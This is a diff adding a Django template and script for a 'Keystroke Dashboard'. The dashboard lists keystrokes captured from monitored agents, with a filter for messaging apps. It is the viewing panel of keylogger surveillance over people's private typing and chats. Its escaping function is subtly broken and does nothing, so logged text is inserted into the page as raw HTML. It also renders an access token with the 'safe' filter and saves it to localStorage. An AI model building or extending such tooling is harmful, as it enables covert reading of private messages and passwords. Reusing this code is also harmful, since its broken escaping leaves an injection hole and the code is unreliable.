@@ -1,0 +1,166 @@
+{% extends "accounts/base.html" %}
+{% load static %}
+
+{% block title %}{{ title|default:"Keystroke Dashboard" }}{% endblock %}
+
+{% block extra_css %}
+<link rel="stylesheet" href="https://cdn.datatables.net/1.13.6/css/dataTables.bootstrap5.min.css">
+<style>
+    /* Your existing CSS is perfect and does not need changes. */
+    .keys-cell { font-family: 'SF Mono', 'Fira Code', Courier, monospace; white-space: pre-wrap; word-break: break-all; font-size: 0.9em; }
+    .special-key { background-color: #e9ecef; color: #dc3545; padding: 2px 5px; border-radius: 4px; border: 1px solid #dee2e6; font-weight: 600; }
+</style>
+{% endblock %}
+
+{% block content %}
+<div class="container mt-4 mb-5">
+    <div class="d-flex justify-content-between align-items-center mb-3">
+        <h1><i class="fas fa-keyboard me-2"></i>{{ title }}</h1>
+        <a href="{% url 'monitor_app:dashboard' %}" class="btn btn-secondary">« Back to Main Dashboard</a>
+    </div>
+    
+    <div class="card shadow-sm">
+        <div class="card-header">
+            <form id="keylog-filters" class="d-flex flex-wrap align-items-end gap-3">
+                <div>
+                    <label for="keylog-agent-select" class="form-label mb-1">Agent</label>
+                    <select id="keylog-agent-select" class="form-select"></select>
+                </div>
+                <div>
+                    <label for="keylog-type-select" class="form-label mb-1">Log Type</label>
+                    <select id="keylog-type-select" class="form-select">
+                        <option value="all" selected>All Typing</option>
+                        <option value="messaging">Messaging Apps Only</option>
+                        <option value="general">General Apps Only</option>
+                    </select>
+                </div>
+                <button type="submit" class="btn btn-primary">Fetch Logs</button>
+            </form>
+        </div>
+        <div class="card-body table-responsive">
+            <table id="keylogTable" class="table table-hover table-sm" style="width:100%">
+                <thead>
+                    <tr>
+                        <th>Agent</th>
+                        <th>Timestamp</th>
+                        <th>Source App / URL</th>
+                        <th>Keystroke Sequence</th>
+                        <th class="text-center">Messaging</th>
+                    </tr>
+                </thead>
+                <tbody id="keylog-tbody">
+                    <!-- JS will populate this -->
+                </tbody>
+            </table>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block extra_js %}
+<script src="https://code.jquery.com/jquery-3.7.0.js"></script>
+<script src="https://cdn.datatables.net/1.13.6/js/jquery.dataTables.min.js"></script>
+<script src="https://cdn.datatables.net/1.13.6/js/dataTables.bootstrap5.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', () => {
+
+    // --- THIS IS THE DEFINITIVE FIX ---
+    
+    // Step 1: Immediately get the token provided by the Django view and save it.
+    // The 'safe' filter prevents issues if the token had special characters.
+    const accessToken = '{{ access_token|safe }}';
+    if (accessToken && accessToken !== 'None') {
+        localStorage.setItem('accessToken', accessToken);
+        console.log("Access token has been embedded and saved to localStorage.");
+    } else {
+        console.error("CRITICAL: No access token was provided by the backend. API calls will fail.");
+    }
+
+    const API_BASE_PATH = '/monitor/api';
+    const keylogAgentSelect = document.getElementById('keylog-agent-select');
+    const keylogTypeSelect = document.getElementById('keylog-type-select');
+    const keylogTbody = document.getElementById('keylog-tbody');
+    const filterForm = document.getElementById('keylog-filters');
+    let keylogDataTable;
+
+    function getAuthToken() {
+        return localStorage.getItem('accessToken');
+    }
+
+    async function authenticatedFetch(url, options = {}) {
+        const token = getAuthToken();
+        if (!token) {
+            throw new Error('Authentication error. Please log in again.');
+        }
+        const headers = { ...options.headers, 'Authorization': `Bearer ${token}` };
+        const response = await fetch(url, { ...options, headers });
+        if (response.status === 401) throw new Error('Authentication error. Your session may have expired.');
+        if (!response.ok) throw new Error(`Server returned an error: ${response.statusText}`);
+        return response.json();
+    }
+
+    async function fetchKeyLogs() {
+        if (keylogDataTable) { keylogDataTable.destroy(); }
+        keylogTbody.innerHTML = '<tr><td colspan="5" class="text-center">Loading...</td></tr>';
+        
+        const params = new URLSearchParams({ agent_id: keylogAgentSelect.value, log_type: keylogTypeSelect.value, limit: 1000 });
+
+        try {
+            const data = await authenticatedFetch(`${API_BASE_PATH}/keylog/history/?${params.toString()}`);
+            
+            keylogTbody.innerHTML = '';
+            if (data.length === 0) {
+                keylogTbody.innerHTML = '<tr><td colspan="5" class="text-center text-muted">No logs found for the selected filters.</td></tr>';
+            } else {
+                data.forEach(item => {
+                    const row = keylogTbody.insertRow();
+                    const appName = item.is_messaging ? `<span class="badge bg-info">IM</span> ${item.source_app}` : item.source_app;
+                    const messagingIcon = item.is_messaging ? `<i class="fas fa-check-circle text-success"></i>` : `<i class="fas fa-times-circle text-secondary"></i>`;
+                    row.innerHTML = `
+                        <td>${item.user_email}<br><small class="text-muted">${item.agent_id.substring(0,8)}...</small></td>
+                        <td>${new Date(item.timestamp).toLocaleString()}</td>
+                        <td>${appName}</td>
+                        <td class="keys-cell">${formatKeystrokes(item.key_sequence)}</td>
+                        <td class="text-center">${messagingIcon}</td>
+                    `;
+                });
+            }
+            keylogDataTable = $('#keylogTable').DataTable({ "order": [[ 1, "desc" ]], "pageLength": 50, "destroy": true });
+        } catch (error) {
+            keylogTbody.innerHTML = `<tr><td colspan="5" class="text-center text-danger"><strong>${error.message}</strong></td></tr>`;
+        }
+    }
+
+    function formatKeystrokes(text) {
+        if (!text) return '';
+        const escaped = text.replace(/&/g, "&").replace(/</g, "<").replace(/>/g, ">");
+        return escaped.replace(/\[(BACKSPACE|ENTER|SHIFT|CTRL|ALT|CMD|WIN|DELETE|TAB)\]/g, '<span class="special-key">[$1]</span>');
+    }
+
+    async function populateAgentSelects() {
+        try {
+            const agents = await authenticatedFetch(`${API_BASE_PATH}/agents/status/`);
+            keylogAgentSelect.innerHTML = '<option value="">All Agents</option>';
+            agents.forEach(agent => {
+                keylogAgentSelect.innerHTML += `<option value="${agent.agent_id}">${agent.user_email}</option>`;
+            });
+        } catch (error) {
+            console.error("Could not populate agent selects:", error);
+            keylogAgentSelect.innerHTML = `<option value="">Error loading agents</option>`;
+        }
+    }
+
+    filterForm.addEventListener('submit', (e) => {
+        e.preventDefault();
+        fetchKeyLogs();
+    });
+
+    async function initializePage() {
+        await populateAgentSelects();
+        fetchKeyLogs();
+    }
+
+    initializePage();
+});
+</script>
+{% endblock %}
